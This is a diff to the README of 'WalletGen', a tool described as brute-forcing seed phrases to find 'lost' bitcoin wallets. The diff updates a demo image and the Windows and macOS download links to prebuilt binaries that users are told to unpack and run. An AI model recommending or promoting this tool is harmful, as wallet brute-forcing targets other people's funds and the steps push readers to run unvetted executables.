@@ -71,7 +71,7 @@ Unlike Python-based brute force tools, **WalletGen** is written in C++ and optim
 </p>
 
 <p align="center">
-    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on MacOS Demo" title="WalletGen search lost bitcoin wallets on MacOS" src="/assets/walletgen_macos2.gif" />
+    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on MacOS Demo" title="WalletGen search lost bitcoin wallets on MacOS" src="/assets/walletgen_macos2.webp" />
 </p>
 
 
@@ -82,13 +82,13 @@ Unlike Python-based brute force tools, **WalletGen** is written in C++ and optim
 # How to start
 
 ## Windows 
-- Download [WalletGen.zip](https://github.com/tony-btc1/seed-phrase-generator/releases/download/walletgen/WalletGen_v1.8.0.zip) (3MB)
+- Download [WalletGen.zip](https://github.com/tony-btc1/seed-phrase-generator/releases/download/walletgen/WalletGen_Windows_v1.8.0.zip) (3MB)
 - Unpack anywhere
 - Run `WalletGen.exe`
 
 ## MacOS
 
-- Download [WalletGen.dmg](https://github.com/tony-btc1/seed-phrase-generator/releases/download/walletgen/WalletGen_v1.8.0.zip) (1MB)
+- Download [WalletGen.dmg](https://github.com/tony-btc1/seed-phrase-generator/releases/download/walletgen/WalletGen-MacOS-arm.dmg) (1MB)
 
 ## Linux (x86-64bit)
 ```bash
